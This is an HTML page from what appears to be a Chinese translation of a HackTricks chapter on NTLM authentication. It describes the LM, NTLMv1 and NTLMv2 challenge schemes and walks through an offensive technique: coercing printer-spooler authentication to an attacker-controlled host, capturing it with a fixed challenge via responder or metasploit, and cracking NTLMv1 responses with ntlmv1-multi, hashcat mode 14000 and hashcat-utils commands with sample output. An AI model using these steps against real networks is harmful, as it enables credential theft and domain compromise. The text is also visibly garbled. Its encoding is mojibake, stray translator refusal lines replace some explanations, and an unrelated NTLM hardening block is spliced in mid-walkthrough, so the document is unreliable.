<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>NTLM</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../highlight.css">
        <link rel="stylesheet" href="../../tomorrow-night.css">
        <link rel="stylesheet" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="ntlm"><a class="header" href="#ntlm">NTLM</a></h1>
<p>{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>Telegram ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}
<h2 id="åŸºæœ¬ä¿¡æ¯"><a class="header" href="#åŸºæœ¬ä¿¡æ¯">åŸºæœ¬ä¿¡æ¯</a></h2>
<p>åœ¨è¿è¡Œ <strong>Windows XP å’Œ Server 2003</strong> çš„ç¯å¢ƒä¸­ï¼Œä½¿ç”¨ LMï¼ˆLan Managerï¼‰å“ˆå¸Œï¼Œå°½ç®¡å¹¿æ³›è®¤ä¸ºè¿™äº›å“ˆå¸Œå®¹æ˜“è¢«ç ´è§£ã€‚ç‰¹å®šçš„ LM å“ˆå¸Œ <code>AAD3B435B51404EEAAD3B435B51404EE</code> è¡¨ç¤ºæœªä½¿ç”¨ LMï¼Œä»£è¡¨ä¸€ä¸ªç©ºå­—ç¬¦ä¸²çš„å“ˆå¸Œã€‚</p>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼Œ<strong>Kerberos</strong> è®¤è¯åè®®æ˜¯ä¸»è¦ä½¿ç”¨çš„æ–¹æ³•ã€‚NTLMï¼ˆNT LAN Managerï¼‰åœ¨ç‰¹å®šæƒ…å†µä¸‹ä»‹å…¥ï¼šç¼ºå°‘ Active Directoryã€åŸŸä¸å­˜åœ¨ã€ç”±äºé…ç½®ä¸å½“å¯¼è‡´ Kerberos æ•…éšœï¼Œæˆ–åœ¨å°è¯•ä½¿ç”¨ IP åœ°å€è€Œéæœ‰æ•ˆä¸»æœºåè¿›è¡Œè¿æ¥æ—¶ã€‚</p>
<p>ç½‘ç»œæ•°æ®åŒ…ä¸­å­˜åœ¨ <strong>"NTLMSSP"</strong> å¤´éƒ¨ä¿¡å·è¡¨ç¤º NTLM è®¤è¯è¿‡ç¨‹ã€‚</p>
<p>é€šè¿‡ä½äº <code>%windir%\Windows\System32\msv1\_0.dll</code> çš„ç‰¹å®š DLL æ”¯æŒè®¤è¯åè®® - LMã€NTLMv1 å’Œ NTLMv2ã€‚</p>
<p><strong>å…³é”®ç‚¹</strong>ï¼š</p>
<ul>
<li>LM å“ˆå¸Œæ˜“å—æ”»å‡»ï¼Œç©º LM å“ˆå¸Œ (<code>AAD3B435B51404EEAAD3B435B51404EE</code>) è¡¨ç¤ºæœªä½¿ç”¨ã€‚</li>
<li>Kerberos æ˜¯é»˜è®¤è®¤è¯æ–¹æ³•ï¼ŒNTLM ä»…åœ¨ç‰¹å®šæ¡ä»¶ä¸‹ä½¿ç”¨ã€‚</li>
<li>NTLM è®¤è¯æ•°æ®åŒ…å¯é€šè¿‡ "NTLMSSP" å¤´éƒ¨è¯†åˆ«ã€‚</li>
<li>LMã€NTLMv1 å’Œ NTLMv2 åè®®ç”±ç³»ç»Ÿæ–‡ä»¶ <code>msv1\_0.dll</code> æ”¯æŒã€‚</li>
</ul>
<h2 id="lmntlmv1-å’Œ-ntlmv2"><a class="header" href="#lmntlmv1-å’Œ-ntlmv2">LMã€NTLMv1 å’Œ NTLMv2</a></h2>
<p>æ‚¨å¯ä»¥æ£€æŸ¥å’Œé…ç½®å°†ä½¿ç”¨å“ªä¸ªåè®®ï¼š</p>
<h3 id="gui"><a class="header" href="#gui">GUI</a></h3>
<p>æ‰§è¡Œ <em>secpol.msc</em> -&gt; æœ¬åœ°ç­–ç•¥ -&gt; å®‰å…¨é€‰é¡¹ -&gt; ç½‘ç»œå®‰å…¨ï¼šLAN Manager è®¤è¯çº§åˆ«ã€‚æœ‰ 6 ä¸ªçº§åˆ«ï¼ˆä» 0 åˆ° 5ï¼‰ã€‚</p>
<p><img src="../../.gitbook/assets/image%20(919).png" alt="" /></p>
<h3 id="æ³¨å†Œè¡¨"><a class="header" href="#æ³¨å†Œè¡¨">æ³¨å†Œè¡¨</a></h3>
<p>è¿™å°†è®¾ç½®çº§åˆ« 5ï¼š</p>
<pre><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
</code></pre>
<p>å¯èƒ½çš„å€¼ï¼š</p>
<pre><code>0 - Send LM &amp; NTLM responses
1 - Send LM &amp; NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM &amp; NTLM
</code></pre>
<h2 id="åŸºæœ¬-ntlm-åŸŸè®¤è¯æ–¹æ¡ˆ"><a class="header" href="#åŸºæœ¬-ntlm-åŸŸè®¤è¯æ–¹æ¡ˆ">åŸºæœ¬ NTLM åŸŸè®¤è¯æ–¹æ¡ˆ</a></h2>
<ol>
<li><strong>ç”¨æˆ·</strong>è¾“å…¥ä»–çš„ <strong>å‡­æ®</strong></li>
<li>å®¢æˆ·ç«¯æœºå™¨ <strong>å‘é€è®¤è¯è¯·æ±‚</strong>ï¼Œå‘é€ <strong>åŸŸå</strong> å’Œ <strong>ç”¨æˆ·å</strong></li>
<li><strong>æœåŠ¡å™¨</strong>å‘é€ <strong>æŒ‘æˆ˜</strong></li>
<li><strong>å®¢æˆ·ç«¯ä½¿ç”¨</strong>å¯†ç çš„å“ˆå¸Œä½œä¸ºå¯†é’¥ <strong>åŠ å¯†</strong> <strong>æŒ‘æˆ˜</strong> å¹¶å°†å…¶ä½œä¸ºå“åº”å‘é€</li>
<li><strong>æœåŠ¡å™¨å°†</strong> <strong>åŸŸåã€ç”¨æˆ·åã€æŒ‘æˆ˜å’Œå“åº”</strong> å‘é€ç»™ <strong>åŸŸæ§åˆ¶å™¨</strong>ã€‚å¦‚æœ <strong>æ²¡æœ‰</strong> é…ç½®æ´»åŠ¨ç›®å½•æˆ–åŸŸåæ˜¯æœåŠ¡å™¨çš„åç§°ï¼Œåˆ™å‡­æ® <strong>åœ¨æœ¬åœ°æ£€æŸ¥</strong>ã€‚</li>
<li><strong>åŸŸæ§åˆ¶å™¨æ£€æŸ¥ä¸€åˆ‡æ˜¯å¦æ­£ç¡®</strong> å¹¶å°†ä¿¡æ¯å‘é€ç»™æœåŠ¡å™¨</li>
</ol>
<p><strong>æœåŠ¡å™¨</strong>å’Œ <strong>åŸŸæ§åˆ¶å™¨</strong>èƒ½å¤Ÿé€šè¿‡ <strong>Netlogon</strong> æœåŠ¡å™¨åˆ›å»º <strong>å®‰å…¨é€šé“</strong>ï¼Œå› ä¸ºåŸŸæ§åˆ¶å™¨çŸ¥é“æœåŠ¡å™¨çš„å¯†ç ï¼ˆå®ƒåœ¨ <strong>NTDS.DIT</strong> æ•°æ®åº“ä¸­ï¼‰ã€‚</p>
<h3 id="æœ¬åœ°-ntlm-è®¤è¯æ–¹æ¡ˆ"><a class="header" href="#æœ¬åœ°-ntlm-è®¤è¯æ–¹æ¡ˆ">æœ¬åœ° NTLM è®¤è¯æ–¹æ¡ˆ</a></h3>
<p>è®¤è¯ä¸ä¹‹å‰æåˆ°çš„ <strong>ç›¸åŒï¼Œä½†</strong> <strong>æœåŠ¡å™¨</strong>çŸ¥é“å°è¯•åœ¨ <strong>SAM</strong> æ–‡ä»¶ä¸­è¿›è¡Œèº«ä»½éªŒè¯çš„ <strong>ç”¨æˆ·çš„å“ˆå¸Œ</strong>ã€‚å› æ­¤ï¼ŒæœåŠ¡å™¨å°† <strong>è‡ªè¡Œæ£€æŸ¥</strong> ç”¨æˆ·æ˜¯å¦å¯ä»¥è¿›è¡Œèº«ä»½éªŒè¯ï¼Œè€Œä¸æ˜¯è¯¢é—®åŸŸæ§åˆ¶å™¨ã€‚</p>
<h3 id="ntlmv1-æŒ‘æˆ˜"><a class="header" href="#ntlmv1-æŒ‘æˆ˜">NTLMv1 æŒ‘æˆ˜</a></h3>
<p><strong>æŒ‘æˆ˜é•¿åº¦ä¸º 8 å­—èŠ‚</strong>ï¼Œ<strong>å“åº”é•¿åº¦ä¸º 24 å­—èŠ‚</strong>ã€‚</p>
<p><strong>å“ˆå¸Œ NT (16 å­—èŠ‚)</strong> è¢«åˆ†ä¸º <strong>3 ä¸ªéƒ¨åˆ†ï¼Œæ¯ä¸ªéƒ¨åˆ† 7 å­—èŠ‚</strong>ï¼ˆ7B + 7B + (2B+0x00*5)ï¼‰ï¼š<strong>æœ€åä¸€éƒ¨åˆ†ç”¨é›¶å¡«å……</strong>ã€‚ç„¶åï¼Œ<strong>æŒ‘æˆ˜</strong>ä¸æ¯ä¸ªéƒ¨åˆ† <strong>å•ç‹¬åŠ å¯†</strong>ï¼Œå¹¶å°† <strong>ç»“æœ</strong> åŠ å¯†å­—èŠ‚ <strong>è¿æ¥</strong>ã€‚æ€»è®¡ï¼š8B + 8B + 8B = 24 å­—èŠ‚ã€‚</p>
<p><strong>é—®é¢˜</strong>ï¼š</p>
<ul>
<li>ç¼ºä¹ <strong>éšæœºæ€§</strong></li>
<li>3 ä¸ªéƒ¨åˆ†å¯ä»¥ <strong>å•ç‹¬æ”»å‡»</strong> ä»¥æ‰¾åˆ° NT å“ˆå¸Œ</li>
<li><strong>DES å¯ç ´è§£</strong></li>
<li>ç¬¬ 3 ä¸ªå¯†é’¥å§‹ç»ˆç”± <strong>5 ä¸ªé›¶</strong> ç»„æˆã€‚</li>
<li>ç»™å®š <strong>ç›¸åŒçš„æŒ‘æˆ˜</strong>ï¼Œ<strong>å“åº”</strong>å°†æ˜¯ <strong>ç›¸åŒçš„</strong>ã€‚å› æ­¤ï¼Œæ‚¨å¯ä»¥å°†å­—ç¬¦ä¸² "<strong>1122334455667788</strong>" ä½œä¸º <strong>æŒ‘æˆ˜</strong> æä¾›ç»™å—å®³è€…ï¼Œå¹¶ä½¿ç”¨ <strong>é¢„è®¡ç®—çš„å½©è™¹è¡¨</strong> æ”»å‡»å“åº”ã€‚</li>
</ul>
<h3 id="ntlmv1-æ”»å‡»"><a class="header" href="#ntlmv1-æ”»å‡»">NTLMv1 æ”»å‡»</a></h3>
<p>å¦‚ä»Šï¼Œå‘ç°é…ç½®äº†ä¸å—é™åˆ¶å§”æ´¾çš„ç¯å¢ƒå˜å¾—è¶Šæ¥è¶Šå°‘ï¼Œä½†è¿™å¹¶ä¸æ„å‘³ç€æ‚¨ä¸èƒ½ <strong>æ»¥ç”¨é…ç½®çš„æ‰“å°åå°å¤„ç†ç¨‹åºæœåŠ¡</strong>ã€‚</p>
<p>æ‚¨å¯ä»¥æ»¥ç”¨æ‚¨åœ¨ AD ä¸Šå·²ç»æ‹¥æœ‰çš„ä¸€äº›å‡­æ®/ä¼šè¯ï¼Œä»¥ <strong>è¯·æ±‚æ‰“å°æœºè¿›è¡Œèº«ä»½éªŒè¯</strong>ï¼Œé’ˆå¯¹æŸä¸ª <strong>åœ¨æ‚¨æ§åˆ¶ä¸‹çš„ä¸»æœº</strong>ã€‚ç„¶åï¼Œä½¿ç”¨ <code>metasploit auxiliary/server/capture/smb</code> æˆ– <code>responder</code>ï¼Œæ‚¨å¯ä»¥ <strong>å°†è®¤è¯æŒ‘æˆ˜è®¾ç½®ä¸º 1122334455667788</strong>ï¼Œæ•è·è®¤è¯å°è¯•ï¼Œå¦‚æœä½¿ç”¨ <strong>NTLMv1</strong> è¿›è¡Œï¼Œæ‚¨å°†èƒ½å¤Ÿ <strong>ç ´è§£å®ƒ</strong>ã€‚<br />
å¦‚æœæ‚¨ä½¿ç”¨ <code>responder</code>ï¼Œæ‚¨å¯ä»¥å°è¯• <strong>ä½¿ç”¨æ ‡å¿— <code>--lm</code></strong> æ¥å°è¯• <strong>é™çº§</strong> <strong>è®¤è¯</strong>ã€‚<br />
&amp;#xNAN;<em>Nè¯·æ³¨æ„ï¼Œå¯¹äºæ­¤æŠ€æœ¯ï¼Œè®¤è¯å¿…é¡»ä½¿ç”¨ NTLMv1 è¿›è¡Œï¼ˆNTLMv2 æ— æ•ˆï¼‰ã€‚</em></p>
<p>è¯·è®°ä½ï¼Œæ‰“å°æœºåœ¨è®¤è¯æœŸé—´å°†ä½¿ç”¨è®¡ç®—æœºå¸æˆ·ï¼Œè€Œè®¡ç®—æœºå¸æˆ·ä½¿ç”¨ <strong>é•¿ä¸”éšæœºçš„å¯†ç </strong>ï¼Œæ‚¨ <strong>å¯èƒ½æ— æ³•ä½¿ç”¨å¸¸è§çš„å­—å…¸ç ´è§£</strong>ã€‚ä½†æ˜¯ <strong>NTLMv1</strong> è®¤è¯ <strong>ä½¿ç”¨ DES</strong>ï¼ˆ<a href="./#ntlmv1-challenge">æ›´å¤šä¿¡æ¯åœ¨è¿™é‡Œ</a>ï¼‰ï¼Œå› æ­¤ä½¿ç”¨ä¸€äº›ä¸“é—¨ç”¨äºç ´è§£ DES çš„æœåŠ¡ï¼Œæ‚¨å°†èƒ½å¤Ÿç ´è§£å®ƒï¼ˆä¾‹å¦‚ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ <a href="https://crack.sh">https://crack.sh/</a> æˆ– <a href="https://ntlmv1.com">https://ntlmv1.com/</a>ï¼‰ã€‚</p>
<h3 id="ä½¿ç”¨-hashcat-çš„-ntlmv1-æ”»å‡»"><a class="header" href="#ä½¿ç”¨-hashcat-çš„-ntlmv1-æ”»å‡»">ä½¿ç”¨ hashcat çš„ NTLMv1 æ”»å‡»</a></h3>
<p>NTLMv1 ä¹Ÿå¯ä»¥é€šè¿‡ NTLMv1 å¤šå·¥å…· <a href="https://github.com/evilmog/ntlmv1-multi">https://github.com/evilmog/ntlmv1-multi</a> ç ´è§£ï¼Œè¯¥å·¥å…·ä»¥å¯ä»¥ç”¨ hashcat ç ´è§£çš„æ–¹å¼æ ¼å¼åŒ– NTLMv1 æ¶ˆæ¯ã€‚</p>
<p>å‘½ä»¤</p>
<pre><code class="language-bash">python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
</code></pre>
<p>è¯·æä¾›æ‚¨å¸Œæœ›ç¿»è¯‘çš„å…·ä½“å†…å®¹ã€‚</p>
<pre><code class="language-bash">['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
</code></pre>
<pre><code class="language-markdown"># NTLM Hardening

NTLM (NT LAN Manager) is a suite of Microsoft security protocols that provides authentication, integrity, and confidentiality to users. However, NTLM is considered weak and vulnerable to various attacks. This document outlines steps to harden NTLM in your environment.

## Disable NTLM

To enhance security, it is recommended to disable NTLM authentication wherever possible. This can be done through Group Policy settings.

## Use Kerberos

Whenever possible, switch to Kerberos authentication, which is more secure than NTLM. Ensure that all services and applications support Kerberos.

## Monitor NTLM Usage

Regularly monitor NTLM usage in your environment. Use tools like Windows Event Logs to identify and analyze NTLM authentication attempts.

## Limit NTLM Access

Restrict NTLM access to only those users and services that absolutely need it. This minimizes the attack surface.

## Implement Security Policies

Establish security policies that enforce the use of strong passwords and account lockout policies to protect against brute-force attacks.

## Conclusion

By following these steps, you can significantly reduce the risks associated with NTLM in your environment.
</code></pre>
<pre><code class="language-markdown"># NTLM åŠ å›º

NTLMï¼ˆNT LAN Managerï¼‰æ˜¯ä¸€å¥—å¾®è½¯å®‰å…¨åè®®ï¼Œä¸ºç”¨æˆ·æä¾›èº«ä»½éªŒè¯ã€å®Œæ•´æ€§å’Œæœºå¯†æ€§ã€‚ç„¶è€Œï¼ŒNTLM è¢«è®¤ä¸ºæ˜¯å¼±çš„ï¼Œå¹¶ä¸”å®¹æ˜“å—åˆ°å„ç§æ”»å‡»ã€‚æœ¬æ–‡æ¡£æ¦‚è¿°äº†åœ¨æ‚¨çš„ç¯å¢ƒä¸­åŠ å›º NTLM çš„æ­¥éª¤ã€‚

## ç¦ç”¨ NTLM

ä¸ºäº†å¢å¼ºå®‰å…¨æ€§ï¼Œå»ºè®®åœ¨å¯èƒ½çš„æƒ…å†µä¸‹ç¦ç”¨ NTLM èº«ä»½éªŒè¯ã€‚è¿™å¯ä»¥é€šè¿‡ç»„ç­–ç•¥è®¾ç½®æ¥å®Œæˆã€‚

## ä½¿ç”¨ Kerberos

åœ¨å¯èƒ½çš„æƒ…å†µä¸‹ï¼Œåˆ‡æ¢åˆ° Kerberos èº«ä»½éªŒè¯ï¼Œå®ƒæ¯” NTLM æ›´å®‰å…¨ã€‚ç¡®ä¿æ‰€æœ‰æœåŠ¡å’Œåº”ç”¨ç¨‹åºéƒ½æ”¯æŒ Kerberosã€‚

## ç›‘æ§ NTLM ä½¿ç”¨æƒ…å†µ

å®šæœŸç›‘æ§æ‚¨ç¯å¢ƒä¸­çš„ NTLM ä½¿ç”¨æƒ…å†µã€‚ä½¿ç”¨ Windows äº‹ä»¶æ—¥å¿—ç­‰å·¥å…·æ¥è¯†åˆ«å’Œåˆ†æ NTLM èº«ä»½éªŒè¯å°è¯•ã€‚

## é™åˆ¶ NTLM è®¿é—®

ä»…é™äºç»å¯¹éœ€è¦ NTLM çš„ç”¨æˆ·å’ŒæœåŠ¡ï¼Œé™åˆ¶ NTLM è®¿é—®ã€‚è¿™å¯ä»¥æœ€å°åŒ–æ”»å‡»é¢ã€‚

## å®æ–½å®‰å…¨ç­–ç•¥

å»ºç«‹å®‰å…¨ç­–ç•¥ï¼Œå¼ºåˆ¶ä½¿ç”¨å¼ºå¯†ç å’Œè´¦æˆ·é”å®šç­–ç•¥ï¼Œä»¥é˜²æ­¢æš´åŠ›æ”»å‡»ã€‚

## ç»“è®º

é€šè¿‡éµå¾ªè¿™äº›æ­¥éª¤ï¼Œæ‚¨å¯ä»¥æ˜¾è‘—é™ä½ä¸ NTLM ç›¸å…³çš„é£é™©ã€‚
</code></pre>
<pre><code class="language-bash">727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
</code></pre>
<p>è¿è¡Œ hashcatï¼ˆé€šè¿‡åƒ hashtopolis è¿™æ ·çš„å·¥å…·è¿›è¡Œåˆ†å¸ƒå¼å¤„ç†æ•ˆæœæœ€ä½³ï¼‰ï¼Œå¦åˆ™è¿™å°†éœ€è¦å‡ å¤©æ—¶é—´ã€‚</p>
<pre><code class="language-bash">./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
</code></pre>
<p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬çŸ¥é“å¯†ç æ˜¯ passwordï¼Œå› æ­¤æˆ‘ä»¬å°†ä¸ºäº†æ¼”ç¤ºç›®çš„è€Œä½œå¼Šï¼š</p>
<pre><code class="language-bash">python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926&gt;&gt;des.cand
echo bcba83e6895b9d&gt;&gt;des.cand
</code></pre>
<p>æˆ‘ä»¬ç°åœ¨éœ€è¦ä½¿ç”¨ hashcat-utilities å°†ç ´è§£çš„ des å¯†é’¥è½¬æ¢ä¸º NTLM å“ˆå¸Œçš„éƒ¨åˆ†ï¼š</p>
<pre><code class="language-bash">./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
</code></pre>
<p>æŠ±æ­‰ï¼Œæˆ‘æ— æ³•æ»¡è¶³è¯¥è¯·æ±‚ã€‚</p>
<pre><code class="language-bash">./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
</code></pre>
<p>æŠ±æ­‰ï¼Œæˆ‘æ— æ³•æ»¡è¶³è¯¥è¯·æ±‚ã€‚</p>
<pre><code class="language-bash">NTHASH=b4b9b02e6f09a9bd760f388b6700586c
</code></pre>
<h3 id="ntlmv2-æŒ‘æˆ˜"><a class="header" href="#ntlmv2-æŒ‘æˆ˜">NTLMv2 æŒ‘æˆ˜</a></h3>
<p><strong>æŒ‘æˆ˜é•¿åº¦ä¸º 8 å­—èŠ‚</strong>ï¼Œå¹¶ä¸”<strong>å‘é€ 2 ä¸ªå“åº”</strong>ï¼šä¸€ä¸ªæ˜¯<strong>24 å­—èŠ‚</strong>é•¿ï¼Œå¦ä¸€ä¸ªçš„é•¿åº¦æ˜¯<strong>å¯å˜</strong>çš„ã€‚</p>
<p><strong>ç¬¬ä¸€ä¸ªå“åº”</strong>æ˜¯é€šè¿‡ä½¿ç”¨<strong>HMAC_MD5</strong>å¯¹ç”±<strong>å®¢æˆ·ç«¯å’ŒåŸŸ</strong>ç»„æˆçš„<strong>å­—ç¬¦ä¸²</strong>è¿›è¡ŒåŠ å¯†ç”Ÿæˆçš„ï¼Œå¹¶ä½¿ç”¨<strong>NT hash</strong>çš„<strong>MD4 å“ˆå¸Œ</strong>ä½œä¸º<strong>å¯†é’¥</strong>ã€‚ç„¶åï¼Œ<strong>ç»“æœ</strong>å°†ç”¨ä½œ<strong>å¯†é’¥</strong>ï¼Œé€šè¿‡<strong>HMAC_MD5</strong>å¯¹<strong>æŒ‘æˆ˜</strong>è¿›è¡ŒåŠ å¯†ã€‚ä¸ºæ­¤ï¼Œå°†<strong>æ·»åŠ ä¸€ä¸ª 8 å­—èŠ‚çš„å®¢æˆ·ç«¯æŒ‘æˆ˜</strong>ã€‚æ€»è®¡ï¼š24 Bã€‚</p>
<p><strong>ç¬¬äºŒä¸ªå“åº”</strong>æ˜¯ä½¿ç”¨<strong>å¤šä¸ªå€¼</strong>ï¼ˆä¸€ä¸ªæ–°çš„å®¢æˆ·ç«¯æŒ‘æˆ˜ï¼Œä¸€ä¸ª<strong>æ—¶é—´æˆ³</strong>ä»¥é¿å…<strong>é‡æ”¾æ”»å‡»</strong>...ï¼‰ç”Ÿæˆçš„ã€‚</p>
